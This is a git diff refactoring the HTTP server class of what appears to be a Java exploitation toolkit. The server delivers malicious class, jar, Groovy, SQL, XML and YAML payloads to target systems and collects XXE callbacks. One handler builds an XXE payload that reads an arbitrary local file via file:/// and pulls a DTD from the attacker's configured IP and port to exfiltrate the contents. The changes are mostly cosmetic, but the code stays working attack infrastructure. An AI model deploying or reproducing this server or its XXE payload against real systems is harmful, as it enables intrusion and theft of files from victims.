@@ -5,18 +5,19 @@ import com.qi4l.JYso.gadgets.Config.Config;
 import com.qi4l.JYso.gadgets.utils.Utils;
 import com.qi4l.JYso.template.ReverseShellTemplate;
 import com.sun.net.httpserver.HttpExchange;
-import com.sun.net.httpserver.HttpHandler;
 import com.sun.net.httpserver.HttpServer;
 import javassist.ClassPool;
 import javassist.CtClass;
 import org.apache.commons.lang3.reflect.FieldUtils;
+import org.apache.logging.log4j.LogManager;
+import org.apache.logging.log4j.Logger;
 
 import java.io.ByteArrayOutputStream;
 import java.io.File;
-import java.io.FileInputStream;
 import java.io.IOException;
 import java.net.InetSocketAddress;
 import java.nio.charset.StandardCharsets;
+import java.nio.file.Files;
 import java.util.HashMap;
 import java.util.Map;
 import java.util.jar.JarOutputStream;
@@ -24,55 +25,54 @@ import java.util.zip.ZipEntry;
 
 import static org.fusesource.jansi.Ansi.ansi;
 
+@SuppressWarnings("HttpUrlsUsage")
 public class HTTPServer {
-    //获取根目录路径
+    private static final Logger log = LogManager.getLogger(HTTPServer.class);
+    // 获取根目录路径
     public static String cwd = System.getProperty("user.dir");
 
     public static void start() throws IOException {
 
         HttpServer httpServer = HttpServer.create(new InetSocketAddress(Config.httpPort), 0);
-        httpServer.createContext("/", new HttpHandler() {
-            @Override
-            public void handle(HttpExchange httpExchange) {
-                try {
-                    System.out.println(ansi().render("@|green [+]|@ New HTTP Request From >>" + httpExchange.getRemoteAddress() + "  " + httpExchange.getRequestURI()));
+        httpServer.createContext("/", httpExchange -> {
+            try {
+                System.out.println(ansi().render("@|green [+]|@ New HTTP Request From >>" + httpExchange.getRemoteAddress() + "  " + httpExchange.getRequestURI()));
 
-                    String qi = String.valueOf(httpExchange.getRequestURI());
+                String qi = String.valueOf(httpExchange.getRequestURI());
 
 
-                    if (qi.contains("setPathAlias")) {
-                        Config.BCEL1 = qi.substring(qi.indexOf("=") + 1);
-                        System.out.println(ansi().render("@|green [+]|@ 获取参数成功 >> " + Config.BCEL1));
-                    } else if (qi.contains("setRoute")) {
-                        Config.ROUTE = qi.substring(qi.indexOf("=") + 1);
-                        System.out.println(ansi().render("@|green [+]|@ 获取路由成功 >> " + Config.ROUTE));
-                    }
-
-                    String path = httpExchange.getRequestURI().getPath();
-                    if (path.endsWith(".class")) {
-                        handleClassRequest(httpExchange);
-                    } else if (path.endsWith(".wsdl")) {
-                        handleWSDLRequest(httpExchange);
-                    } else if (path.endsWith(".jar")) {
-                        handleJarRequest(httpExchange);
-                    } else if (path.startsWith("/xxelog")) {
-                        handleXXELogRequest(httpExchange);
-                    } else if (path.endsWith(".sql")) {
-                        handleSQLRequest(httpExchange);
-                    } else if (path.endsWith(".groovy")) {
-                        handlerGroovyRequest(httpExchange);
-                    } else if (path.endsWith(".xml")) {
-                        handleXMLRequest(httpExchange);
-                    } else if (path.endsWith(".txt")) {
-                        handleTXTRequest(httpExchange);
-                    } else if (path.endsWith(".yml")) {
-                        handleYmlRequest(httpExchange);
-                    } else {
-                        handleFileRequest(httpExchange);
-                    }
-                } catch (Exception e) {
-                    e.printStackTrace();
+                if (qi.contains("setPathAlias")) {
+                    Config.BCEL1 = qi.substring(qi.indexOf("=") + 1);
+                    System.out.println(ansi().render("@|green [+]|@ 获取参数成功 >> " + Config.BCEL1));
+                } else if (qi.contains("setRoute")) {
+                    Config.ROUTE = qi.substring(qi.indexOf("=") + 1);
+                    System.out.println(ansi().render("@|green [+]|@ 获取路由成功 >> " + Config.ROUTE));
                 }
+
+                String path = httpExchange.getRequestURI().getPath();
+                if (path.endsWith(".class")) {
+                    handleClassRequest(httpExchange);
+                } else if (path.endsWith(".wsdl")) {
+                    handleWSDLRequest(httpExchange);
+                } else if (path.endsWith(".jar")) {
+                    handleJarRequest(httpExchange);
+                } else if (path.startsWith("/xxelog")) {
+                    handleXXELogRequest(httpExchange);
+                } else if (path.endsWith(".sql")) {
+                    handleSQLRequest(httpExchange);
+                } else if (path.endsWith(".groovy")) {
+                    handlerGroovyRequest(httpExchange);
+                } else if (path.endsWith(".xml")) {
+                    handleXMLRequest(httpExchange);
+                } else if (path.endsWith(".txt")) {
+                    handleTXTRequest(httpExchange);
+                } else if (path.endsWith(".yml")) {
+                    handleYmlRequest(httpExchange);
+                } else {
+                    handleFileRequest(httpExchange);
+                }
+            } catch (Exception e) {
+                log.error("e: ", e);
             }
         });
 
@@ -86,16 +86,7 @@ public class HTTPServer {
         String path = exchange.getRequestURI().getPath();
         String filename = cwd + File.separator + "data" + File.separator + path.substring(path.lastIndexOf("/") + 1);
         File file = new File(filename);
-        if (file.exists()) {
-            byte[] bytes = new byte[(int) file.length()];
-            FileInputStream fileInputStream = new FileInputStream(file);
-            fileInputStream.read(bytes);
-            exchange.sendResponseHeaders(200, file.length() + 1);
-            exchange.getResponseBody().write(bytes);
-        } else {
-            System.out.println(ansi().render("@|red [!] Response Code: |@" + 404));
-            exchange.sendResponseHeaders(404, 0);
-        }
+        serveFileContent(exchange, file, null, null);
         exchange.close();
 
     }
@@ -120,18 +111,7 @@ public class HTTPServer {
         } else {
             String pa = cwd + File.separator + "data";
             File file = new File(pa + File.separator + YamlName + ".yml");
-            if (file.exists()) {
-                byte[] bytes1 = new byte[(int) file.length()];
-                try (FileInputStream fileInputStream = new FileInputStream(file)) {
-                    fileInputStream.read(bytes1);
-                }
-                exchange.getResponseHeaders().set("Content-type", "application/octet-stream");
-                exchange.sendResponseHeaders(200, file.length() + 1);
-                exchange.getResponseBody().write(bytes1);
-            } else {
-                System.out.println(ansi().render("@|red [!] Response Code: |@" + 404));
-                exchange.sendResponseHeaders(404, 0);
-            }
+            serveFileContent(exchange, file, "Content-type", "application/octet-stream");
 
         }
         exchange.close();
@@ -150,19 +130,7 @@ public class HTTPServer {
             String pa = cwd + File.separator + "data";
             File file = new File(pa + File.separator + txtname + ".txt");
 
-            if (file.exists()) {
-
-                byte[] bytes1 = new byte[(int) file.length()];
-                try (FileInputStream fileInputStream = new FileInputStream(file)) {
-                    fileInputStream.read(bytes1);
-                }
-                exchange.getResponseHeaders().set("Content-type", "application/octet-stream");
-                exchange.sendResponseHeaders(200, file.length() + 1);
-                exchange.getResponseBody().write(bytes1);
-            } else {
-                System.out.println(ansi().render("@|red [!] Response Code: @|" + 404));
-                exchange.sendResponseHeaders(404, 0);
-            }
+            serveFileContent(exchange, file, "Content-type", "application/octet-stream");
         }
         exchange.close();
     }
@@ -283,19 +251,7 @@ public class HTTPServer {
             String pa = cwd + File.separator + "data";
             File file = new File(pa + File.separator + xmlName + ".xml");
 
-            if (file.exists()) {
-                byte[] bytes1 = new byte[(int) file.length()];
-                try (FileInputStream fileInputStream = new FileInputStream(file)) {
-                    fileInputStream.read(bytes1);
-                }
-                exchange.getResponseHeaders().add("Content-Type", "application/xml; charset=utf-8");
-//                exchange.getResponseHeaders().set("Content-type","application/octet-stream");
-                exchange.sendResponseHeaders(200, file.length() + 1);
-                exchange.getResponseBody().write(bytes1);
-            } else {
-                System.out.println(ansi().render("@|red [!] Response Code: |@" + 404));
-                exchange.sendResponseHeaders(404, 0);
-            }
+            serveFileContent(exchange, file, "Content-Type", "application/xml; charset=utf-8");
 
         }
         exchange.close();
@@ -331,18 +287,7 @@ public class HTTPServer {
             String pa = cwd + File.separator + "data";
             File file = new File(pa + File.separator + sqlName + ".sql");
 
-            if (file.exists()) {
-                byte[] bytes = new byte[(int) file.length()];
-                try (FileInputStream fileInputStream = new FileInputStream(file)) {
-                    fileInputStream.read(bytes);
-                }
-//                exchange.getResponseHeaders().set("Content-type","application/octet-stream");
-                exchange.sendResponseHeaders(200, file.length() + 1);
-                exchange.getResponseBody().write(bytes);
-            } else {
-                System.out.println(ansi().render("@|red [!] Response Code: |@" + 404));
-                exchange.sendResponseHeaders(404, 0);
-            }
+            serveFileContent(exchange, file, null, null);
         }
         exchange.close();
     }
@@ -371,18 +316,7 @@ public class HTTPServer {
             String pa = cwd + File.separator + "data";
             File file = new File(pa + File.separator + groovyName + ".groovy");
 
-            if (file.exists()) {
-                byte[] bytes = new byte[(int) file.length()];
-                try (FileInputStream fileInputStream = new FileInputStream(file)) {
-                    fileInputStream.read(bytes);
-                }
-//                exchange.getResponseHeaders().set("Content-type","application/octet-stream");
-                exchange.sendResponseHeaders(200, file.length() + 1);
-                exchange.getResponseBody().write(bytes);
-            } else {
-                System.out.println(ansi().render("@|red [!] Response Code: |@" + 404));
-                exchange.sendResponseHeaders(404, 0);
-            }
+            serveFileContent(exchange, file, null, null);
 
         }
         exchange.close();
@@ -440,10 +374,7 @@ public class HTTPServer {
         File file = new File(pa);
 
         if (file.exists()) {
-            byte[] bytes = new byte[(int) file.length()];
-            try (FileInputStream fileInputStream = new FileInputStream(file)) {
-                fileInputStream.read(bytes);
-            }
+            byte[] bytes = Files.readAllBytes(file.toPath());
             exchange.getResponseHeaders().set("Content-type", "application/octet-stream");
             exchange.sendResponseHeaders(200, file.length());
             exchange.getResponseBody().write(bytes);
@@ -465,18 +396,18 @@ public class HTTPServer {
         String path = exchange.getRequestURI().getPath().substring(1);
 
         if (path.startsWith("list")) {
-            //intended to list directories or read files on server
+            // intended to list directories or read files on server
             String file = params.get("file");
             if (file != null && !file.isEmpty()) {
-                String listWsdl = "" +
+                String listWsdl =
                         "<!DOCTYPE x [\n" +
-                        "  <!ENTITY % aaa SYSTEM \"file:///" + file + "\">\n" +
-                        "  <!ENTITY % bbb SYSTEM \"http://" + Config.ip + ":" + Config.httpPort + "/http.wsdl\">\n" +
-                        "  %bbb;\n" +
-                        "]>\n" +
-                        "<definitions name=\"HelloService\" xmlns=\"http://schemas.xmlsoap.org/wsdl/\">\n" +
-                        "  &ddd;\n" +
-                        "</definitions>";
+                                "  <!ENTITY % aaa SYSTEM \"file:///" + file + "\">\n" +
+                                "  <!ENTITY % bbb SYSTEM \"http://" + Config.ip + ":" + Config.httpPort + "/http.wsdl\">\n" +
+                                "  %bbb;\n" +
+                                "]>\n" +
+                                "<definitions name=\"HelloService\" xmlns=\"http://schemas.xmlsoap.org/wsdl/\">\n" +
+                                "  &ddd;\n" +
+                                "</definitions>";
 
                 System.out.println(ansi().render("@|green [+] Response Code: |@" + 200));
                 exchange.sendResponseHeaders(200, listWsdl.getBytes().length);
@@ -528,6 +459,20 @@ public class HTTPServer {
         }
     }
 
+    private static void serveFileContent(HttpExchange exchange, File file, String headerKey, String headerValue) throws IOException {
+        if (file.exists()) {
+            byte[] bytes = Files.readAllBytes(file.toPath());
+            if (headerKey != null) {
+                exchange.getResponseHeaders().set(headerKey, headerValue);
+            }
+            exchange.sendResponseHeaders(200, file.length() + 1);
+            exchange.getResponseBody().write(bytes);
+        } else {
+            System.out.println(ansi().render("@|red [!] Response Code: |@" + 404));
+            exchange.sendResponseHeaders(404, 0);
+        }
+    }
+
     private static Map<String, String> parseQuery(String query) {
         Map<String, String> params = new HashMap<>();
 
@@ -537,11 +482,11 @@ public class HTTPServer {
                     String[] parts = str.split("=", 2);
                     params.put(parts[0], parts[1]);
                 } catch (Exception e) {
-                    //continue
+                    // continue
                 }
             }
         } catch (Exception e) {
-            //continue
+            // continue
         }
 
         return params;
